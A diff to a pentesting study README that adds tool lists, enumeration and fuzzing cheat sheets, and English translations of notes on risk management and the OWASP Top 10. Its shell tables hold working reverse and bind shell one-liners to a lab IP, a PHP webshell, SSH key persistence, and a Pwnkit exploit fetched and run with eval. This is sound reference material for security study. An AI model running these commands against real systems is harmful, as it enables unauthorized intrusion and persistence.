@@ -1,5 +1,66 @@
 # Infosec
 
+## Tools
+
+### DNS
+ - [Dnscan](https://github.com/rbsec/dnscan) - Dnscan is a python wordlist-based DNS subdomain scanner
+
+### Port scanner
+ - [Nmap](https://github.com/nmap/nmap) - The Network Mapper
+ - [Zmap](https://github.com/zmap/zmap) - ZMap is a fast single packet network scanner designed for Internet-wide network surveys
+ - [Rustscan](https://github.com/RustScan/RustScan) - The modern port scanner
+
+### Brute force urls
+ - [gobuster](https://github.com/OJ/gobuster) - Directory/File, DNS and VHost busting tool written in Go
+
+### Passive subdomains enumeration
+ - [VirusTotal](https://www.virustotal.com/gui/home/upload) - Analyze suspicious files, domains, IPs and URLs to detect malware and other breaches
+ - [Censys](https://censys.io/) - Censys continually scans the public IPv4 address space on 3,552+ ports using automatic protocol detection to present the most accurate representation of the Internet's current state.
+ - [Censys](https://censys.io/) - Certificate search tool
+
+## Active subdomains enumeration
+ - [HackerTarget](https://hackertarget.com/zone-transfer/) - From attack surface discovery to vulnerability identification, actionable network intelligence for IT & security operations.
+ - [Gobuster](https://hackertarget.com/zone-transfer/) - Directory/File, DNS and VHost busting tool written in Go
+ - [Omnisint](sonar.omnisint.io) - Rapid7's DNS Database easily searchable via a lightening fast API, with domains available in milliseconds
+
+### Passive infrastructure identification
+ - [Netcraft](https://www.netcraft.com/) - Find out the technologies and infrastructure of any site
+ - [WayBackMachine](http://web.archive.org/) - Digital archive of the World Wide Web
+ - [WayBackURLs](https://github.com/tomnomnom/waybackurls) - Fetch all the URLs that the Wayback Machine knows about for a domain
+
+### Active infrastructure identification
+ - [Whatweb](https://github.com/urbanadventurer/WhatWeb) - Next generation web scanner
+ - [Aquatone](https://github.com/michenriksen/aquatone) - A Tool for Domain Flyovers
+ - [Wafw00f](https://github.com/EnableSecurity/wafw00f) - WAFW00F allows one to identify and fingerprint Web Application Firewall products protecting a website.
+ - [Wappalyzer](https://www.wappalyzer.com/) - Technology profiler, find out what websites are built with
+
+### Web server scanner / Vulnerability scanner
+ - [OpenVAS](https://www.openvas.org/) - Powerful open source vulnerability scanner
+ - [Nikto](https://github.com/sullo/nikto) - Web server scanner
+ - [WPscan](https://github.com/wpscanteam/wpscan) - WPScan WordPress security scanner
+
+### Web Fuzzer
+ - [Ffuf](https://github.com/ffuf/ffuf) - Fast web fuzzer written in Go
+
+### Web Proxies
+ - [Owasp ZAP](https://github.com/zaproxy/zaproxy) - The OWASP ZAP core project
+ - [Burp](https://portswigger.net/burp) - Automated, scalable web vulnerability scanning
+
+### SNMP
+ - [Onesixtyone](https://github.com/trailofbits/onesixtyone) - Fast SNMP Scanner
+
+ ### Privilege escalation
+ - [LinEnum](https://github.com/rebootuser/LinEnum) - Scripted Local Linux Enumeration & Privilege Escalation Checks
+ - [Pwnkit pkexec](https://github.com/berdav/CVE-2021-4034) - CVE-2021-4034 1day
+
+### Passeword cracking 
+ - [Hashcat](https://github.com/hashcat/hashcat) - World's fastest and most advanced password recovery utility
+
+### Wordlists
+ - [Seclist](https://github.com/danielmiessler/SecLists) - Collection of multiple types of lists used during security assessments, collected in one place
+ - [Hob0Rules](https://github.com/praetorian-inc/Hob0Rules) - Password cracking rules for Hashcat based on statistics and industry patterns
+
+
 ## Sheetcheat
 
 ### Service Scanning
@@ -19,6 +80,45 @@
 | Brute force SNMP secret string | `` onesixtyone -c dict.txt 10.10.10.40 `` |
 | Scan number of open ports | `` rustscan -a 10.10.10.10 -u 3000 `` |
 
+
+### DNS Enumeration
+| Description        | Command      |
+| ------ | ----- |
+| Identify the A record for the target domain | `` nslookup $TARGET `` |
+| Identify the A record for the target domain |``nslookup -query=A $TARGET ``|
+| Identify the A record for the target domain | `` dig $TARGET @<nameserver/IP>	 `` |
+| Identify the A record for the target domain |``dig a $TARGET @<nameserver/IP> ``|
+| Identify the PTR record for the target IP address | `` nslookup -query=PTR <IP>	`` |
+| Identify the PTR record for the target IP address |``dig -x <IP> @<nameserver/IP>	``|
+| Identify ANY records for the target domain | `` nslookup -query=ANY $TARGET `` |
+| Identify ANY records for the target domain |`` dig any $TARGET @<nameserver/IP> ``|
+| Identify the TXT records for the target domain | `` nslookup -query=TXT $TARGET `` |
+| Identify the TXT records for the target domain |`` dig txt $TARGET @<nameserver/IP> ``|
+| Identify the MX records for the target domain | `` nslookup -query=MX $TARGET `` |
+| Identify the MX records for the target domain |`` dig mx $TARGET @<nameserver/IP>	 ``|
+
+### Passive Infrastructure Identification
+| Description        | Command      |
+| ------ | ----- |
+| Waybackurls: crawling URLs from a domain with the date it was obtained. | `` waybackurls -dates https://$TARGET > waybackurls.txt`` |
+
+### Active Infrastructure Identification
+| Description        | Command      |
+| ------ | ----- |
+| Whatweb technology identification | `` whatweb -a https://www.example.com -v `` |
+| Display HTTP headers of the target webserver |``curl -I "http://${TARGET}" ``|
+| Aquatone: makes screenshots of all subdomains in the subdomain.list |``cat subdomain.list | aquatone -out ./aquatone -screenshot-timeout 1000 ``|
+| WAF Fingerprinting |`` wafw00f -v https://$TARGE ``|
+
+### Passive Subdomain Enumeration
+| All subdomains for a given domain | `` curl -s https://sonar.omnisint.io/subdomains/{domain} | jq -r '.[]' | sort -u `` |
+| All TLDs found for a given domain | `` curl -s https://sonar.omnisint.io/tlds/{domain} | jq -r '.[]' | sort -u `` |
+| All results across all TLDs for a given domain | `` curl -s https://sonar.omnisint.io/all/{domain} | jq -r '.[]' | sort -u `` |
+| Reverse DNS lookup on IP address | `` curl -s https://sonar.omnisint.io/reverse/{ip} | jq -r '.[]' | sort -u `` |
+| Reverse DNS lookup of a CIDR range | `` curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} | jq -r '.[]' | sort -u `` |
+| Certificate Transparency | ``curl -s "https://crt.sh/?q=${TARGET}&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u `` |
+| Searching for subdomains and other information on the sources provided in the source.txt list | `` cat sources.txt | while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done `` |
+
 ### Web Enumeration
 | Description        | Command      |
 | ------ | ----- |
@@ -31,14 +131,14 @@
 ### Fuzzing
 | Description        | Command      |
 | ------ | ----- |
-| Directory Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ `` |
-| Extension Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ `` |
-| Page Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php `` |
+| Directory Fuzzing with ffuf | `` ffuf -w /Seclist/Discovery/Web-content/directory.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ `` |
+| Extension Fuzzing with ffuf | `` ffuf -w /Seclist/Discovery/Web-content/web-extension.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ `` |
+| Page Fuzzing with ffuf | `` ffuf -w /Seclist/Discovery/Web-content/directory.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php `` |
 | Recursive Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v `` |
-| Subdomain Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u https://FUZZ.example.com `` |
+| Subdomain Fuzzing with ffuf | `` ffuf -w /Seclist/Discovery/Web-content/subdomains.txt:FUZZ -u https://FUZZ.example.com `` |
 | VHost Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://example.com:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx `` |
-| Get parameter Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://example.com:PORT/admin/admin.php?FUZZ=key -fs xxx `` |
-| Post parameter Fuzzing with ffuf | `` ffuf -w wordlist.txt:FUZZ -u http://example.com:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx `` |
+| Get parameter Fuzzing with ffuf | `` ffuf -w /Seclist/Discovery/Web-convent/burp-parameters.txt:FUZZ -u http://example.com:PORT/admin/admin.php?FUZZ=key -fs xxx `` |
+| Post parameter Fuzzing with ffuf | `` ffuf -w /Seclist/Discovery/Web-convent/burp-parameters.txt:FUZZ -u http://example.com:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx `` |
 | Value Fuzzing with ffuf | ``ffuf -w ids.txt:FUZZ -u http://example.com:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx `` |
 
 ### Wordlists
@@ -48,17 +148,18 @@
 | Extension wordlist | `` /secLists/Discovery/Web-Content/web-extensions.txt `` || Directory and page wordlist | `` secLists/Discovery/Web-Content/directory-list-2.3-small.txt `` |
 | Domain wordlist | `` secLists/Discovery/DNS/subdomains-top1million-5000.txt `` |
 | Parameters wordlist | `` secLists/Discovery/Web-Content/burp-parameter-names.txt `` |
+| Create integer wordlist | `` for i in $(seq 1 1000); do echo $i >> ids.txt; done `` |
 
 ### Public exploit
 | Description        | Command      |
 | ------ | ----- |
-| Search for public exploits for a web application	 | ``searchsploit openssh 7.2	 `` |
+| Search for public exploits for a web application	 | `` searchsploit openssh 7.2 `` |
 | MSF: Start the Metasploit Framework | `` msfconsole `` |
-| MSF: Search for public exploits in MSF | `` search exploit eternalblue	 `` |
+| MSF: Search for public exploits in MSF | `` search exploit eternalblue `` |
 | MSF: Start using an MSF module | `` use exploit/windows/smb/ms17_010_psexec `` |
 | MSF: Show required options for an MSF module | `` show options `` |
-| MSF: Set a value for an MSF module option | `` set RHOSTS 10.10.10.40		 `` |
-| MSF: Test if the target server is vulnerable | `` check	 `` |
+| MSF: Set a value for an MSF module option | `` set RHOSTS 10.10.10.40	 `` |
+| MSF: Test if the target server is vulnerable | `` check `` |
 | MSF: Run the exploit on the target server is vulnerable | `` exploit `` |
 
 ### Using Shells
@@ -71,7 +172,7 @@
 | Start a bind shell on the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1 \| nc -lvp 1234 >/tmp/f `` |
 | Start a reverse shell from php | `` <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.14.2 4444 >/tmp/f"); ?> `` |
 | Connect to a bind shell started on the remote server | `` nc 10.10.10.1 1234	 `` |
-| Upgrade shell TTY (1) | ``python -c 'import pty; pty.spawn("/bin/bash")' `` |
+| Python: Upgrade shell TTY | ``python -c 'import pty; pty.spawn("/bin/bash")' `` |
 | Upgrade shell TTY (2) | `` ctrl+z then stty raw -echo then fg then enter twice `` |
 | Create a webshell php file | `` echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php `` |
 | Execute a command on an uploaded webshell | `` curl http://SERVER_IP:PORT/shell.php?cmd=id `` |
@@ -90,7 +191,9 @@
 | Create a new SSH key | `` ssh-keygen -f key	`` |
 | Add the generated public key to the user | `` echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys `` |
 | SSH to the server with the generated private key | `` ssh root@10.10.10.10 -i key	`` |
-| Add a reverse shell at the end of file | `` echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1\|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh ``
+| Add a reverse shell at the end of file | `` echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.14.2 8443 >/tmp/f' \| tee -a monitor.sh ``|
+| Single script pwnkit pkexec CVE-2021-4034 | `` eval "$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)" `` |
+
 
 ### Transferring Files
 | Description        | Command      |
@@ -100,7 +203,7 @@
 | Download a file on the remote server from our local machine | `` curl http://10.10.14.1:8000/linenum.sh -o linenum.sh	`` |
 | Transfer a file to the remote server with scp (requires SSH access) | `` scp linenum.sh user@remotehost:/tmp/linenum.sh	`` |
 | Convert a file to base64 | `` base64 shell -w 0	`` |
-| Convert a file from base64 back to its orig | ``echo f0VMR...SNIO...InmDwU | base64 -d > shell `` |
+| Convert a file from base64 back to its orig | ``echo f0VMR...SNIO...InmDwU \| base64 -d > shell `` |
 | Check the file's md5sum to ensure it converted correctly | `` md5sum shell `` |
 
 
@@ -121,6 +224,13 @@
 | cURL OPTIONS request | ``  curl -X OPTIONS http://example.com/ -vv	`` |
 | File upload with cURL | ``  curl -X PUT -d @test.txt http://example.com/test.txt -vv `` |
 | DELETE method with cURL | ``  curl -X DELETE http://example.com/test.txt -vv	`` |
+| cURL w/ POST |`` curl http://example.com:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded' `` |
+
+### Misc
+| Description        | Command      |
+| ------ | ----- |
+| Add DNS entry | `` sudo sh -c 'echo "SERVER_IP example.com" >> /etc/hosts' `` |
+
 
 ## Pentesting iteration
 
@@ -145,52 +255,49 @@
 ## Risk Management Process
 
 **- Identifying the Risk:**
-Identifier les risques auxquels l'entreprise est exposée, tels que les risques juridiques, environnementaux, de marché, réglementaires et autres.
+Identify the risks to which the business is exposed, such as legal, environmental, market, regulatory and other risks.
 
 **- Analyze the Risk:**
-Analyser les risques pour déterminer leur impact et leur probabilité. Les risques doivent être mis en correspondance avec les diverses politiques, procédures et processus opérationnels de l'organisation.
+Analyze risks to determine their impact and likelihood. Risks should be mapped to the organization's various operational policies, procedures and processes.
 
 **- Evaluate the Risk:**
-Évaluer, classer et hiérarchiser les risques. Ensuite, l'organisation doit décider d'accepter (inévitable), d'éviter (changer les plans), de contrôler (atténuer) ou de transférer le risque (assurer).
+Assess, classify and prioritize risks. Then the organization must decide whether to accept (inevitable), avoid (change plans), control (mitigate) or transfer the risk (insure).
 
 **- Dealing with Risk:**
-Éliminer ou contenir au mieux les risques. Ceci est géré en s'interface directement avec les parties prenantes pour le système ou le processus auquel le risque est associé.
+Eliminate or contain the risks as best as possible. This is managed by directly interfacing with stakeholders for the system or process to which the risk is associated.
 
 **- Monitoring Risk:**
-Tous les risques doivent être surveillés en permanence. Les risques doivent être surveillés en permanence pour détecter tout changement de situation susceptible de modifier leur score d'impact, from low to medium or high impact.
+All risks must be continuously monitored. Risks should be continuously monitored for any changes in circumstances that may change their impact score, from low to medium or high impact.
 
-To do:
-- Re-setup une VM entre chaque client pour ne pas mélanger les clients.
-- On doit pouvoir setup une VM rapidement.
 
 ## Top OWASP
 
 **- Injection:**
-Injection SQL, injection de commandes, injection LDAP, etc.
+SQL injection, command injection, LDAP injection, etc.
 
 **- Broken Auhtentification:**
-Les erreurs de configuration de l'authentification et de la gestion des sessions peuvent conduire à un accès non autorisé à une application par le biais d'attaques de devinette de mot de passe ou d'un délai d'expiration de session incorrect, entre autres problèmes.
+Misconfigurations of authentication and session management can lead to unauthorized access to an application through password guessing attacks or improper session timeout, among others problems.
 
 **- Sensitive Data Exposure:**
-Protéger de manière inappropriée les données telles que les informations financières, de santé ou personnellement identifiables.
+Inappropriately protect data such as financial, health or personally identifiable information.
 
 **- XML External Entities:**
-Processeurs XML mal configurés pouvant entraîner la divulgation de fichiers internes, l'analyse des ports, l'exécution de code à distance ou des attaques par déni de service.
+Misconfigured XML processors that can lead to internal file disclosure, port scanning, remote code execution, or denial of service attacks.
 
 **- Broken Access control:**
-Les restrictions ne sont pas mises en œuvre de manière appropriée pour empêcher les utilisateurs d'accéder à d'autres comptes d'utilisateurs, d'afficher des données sensibles, d'accéder à des fonctionnalités non autorisées, de modifier des données, etc.
+Restrictions are not implemented appropriately to prevent users from accessing other user accounts, viewing sensitive data, accessing unauthorized features, modifying data, etc.
 
 **- Security misconfiguration:**
-Configurations par défaut non sécurisées, stockage en cloud ouvert, messages d'erreur qui divulguent trop d'informations.
+Insecure default configurations, open cloud storage, error messages that leak too much information.
 
 **- Cross-site Scripting XSS:**
-XSS se produit lorsqu'une application ne nettoie pas correctement les entrées fournies par l'utilisateur, permettant l'exécution de HTML ou de JavaScript dans le navigateur d'une victime. Cela peut entraîner un piratage de session, une dégradation du site Web, une redirection d'un utilisateur vers un site Web malveillant, etc.
+XSS occurs when an application improperly sanitizes user-supplied input, allowing HTML or JavaScript to execute in a victim's browser. This can lead to session hijacking, website defacement, redirecting a user to a malicious website, and more.
 
 **- Insecure Deserialization:**
-Cette faille conduit souvent à de l'exécution de code, à des attaques par injection ou à des attaques par élévation de privilèges.
+This flaw often leads to code execution, injection attacks or privilege escalation attacks.
 
 **- Using component with known vulnerabilities:**
-Tous les composants utilisés par une application (bibliothèques, frameworks, modules logiciels) s'exécutent avec le même privilège que l'application. Si l'application utilise des composants présentant des défauts connus, cela peut entraîner l'exposition de données sensibles ou une exécution de code à distance.
+All components used by an application (libraries, frameworks, software modules) run with the same privilege as the application. If the application uses components with known flaws, it may lead to exposure of sensitive data or remote code execution.
 
 **- Insufficient Logging & monitoring:**
-Des failles dans la journalisation et la surveillance peuvent permettre à une attaque réussie de passer inaperçue, aux attaquants d'établir une connexion persistante dans le réseau, de falsifier ou d'extraire des données sensibles sans se faire remarquer.
+Flaws in logging and monitoring can allow a successful attack to go undetected, attackers to establish a persistent connection in the network, to tamper with or extract sensitive data without being noticed.
